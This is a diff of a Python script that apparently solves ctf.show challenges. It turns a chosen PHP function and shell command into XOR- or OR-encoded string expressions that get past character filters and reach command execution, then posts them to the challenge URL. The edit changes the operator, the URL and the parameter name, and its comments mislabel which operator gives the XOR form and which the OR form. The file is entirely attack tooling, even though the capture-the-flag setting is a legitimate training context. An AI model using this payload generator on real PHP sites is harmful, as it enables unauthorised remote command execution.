@@ -3,7 +3,7 @@ import urllib
 from sys import *
 import os
 
-os.system("php 或运算字符.php")  # 没有将php写入环境变量需手动运行
+#   os.system("php 或运算字符.php")  # 没有将php写入环境变量需手动运行
 """
 if (len(argv) != 2):
     print("=" * 50)
@@ -12,7 +12,7 @@ if (len(argv) != 2):
     print("=" * 50)
     exit(0)
 """
-url = 'http://f68d940e-39ef-42f3-9a5d-36505f0f3b66.challenge.ctf.show/'
+url = 'http://01f209b7-573b-45af-aab9-1c4e4a996260.challenge.ctf.show/'
 
 
 # url = argv[1]
@@ -35,8 +35,8 @@ def action(arg):
         f.close()
 
     #   改为  output = "(\"" + s1 + "\"|\"" + s2 + "\")"  则为异或绕过
-    #   改为  output = "(\"" + s1 + "\"|\"" + s2 + "\")"  则为或绕过
-    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
+    #   改为  output = "(\"" + s1 + "\"^\"" + s2 + "\")"  则为或绕过
+    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
     return (output)
 
 
@@ -45,8 +45,8 @@ while True:
     param = action(input("\n[+] your function：")) + action(input("[+] your command："))
     print(param, "\n")
     data = {
-        'c': urllib.parse.unquote(param)  # Payload:    ?c=
+        'v3': urllib.parse.unquote(param)  # Payload:    ?c=
 
     }
-    r = requests.post(url, data=data)
-    print("\n[*] result:\n" + r.text)
+    # r = requests.post(url, data=data)
+    # print("\n[*] result:\n" + r.text)
